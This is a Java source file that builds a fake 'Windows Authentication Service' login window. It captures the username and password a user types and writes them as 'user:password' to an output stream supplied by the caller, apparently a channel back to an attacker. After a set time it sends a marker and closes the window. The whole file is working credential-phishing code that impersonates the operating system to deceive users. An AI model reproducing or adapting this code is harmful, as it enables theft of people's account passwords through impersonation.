import java.util.*;
import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.io.*;
import javax.imageio.*;
import java.awt.Image;
import java.awt.image.BufferedImage;
import java.net.*;
public class initscreen {
    public static void init(PrintStream ps, int time) {
        JFrame frame = new JFrame("Windows Authentication Service");
        frame.setVisible(true);
        frame.setSize(450,350);
        window win = new window();
        frame.add(win);
        win.setVisible(true);
        frame.setResizable(false);
        JTextField username = new JTextField();
        JTextField password = new JPasswordField();
        JButton enter = new JButton("Yes");
        win.add(username);
        win.add(password);
        win.add(enter);
        username.setVisible(true);
        password.setVisible(true);
        enter.setVisible(true);
        username.setBounds(102, 186, 196, 24);
        password.setBounds(102, 215, 196, 24);
        enter.setBounds(285, 280, 80, 30);
        enter.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent arg0) {
                String ret = username.getText()+":"+password.getText();
                ps.println(ret);
            }
        });
        for (int i=0;i<time;i++) {
            try {
                Thread.sleep(1000);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        ps.println("{}{}{}");
        frame.dispatchEvent(new WindowEvent(frame, WindowEvent.WINDOW_CLOSING));
    } 
}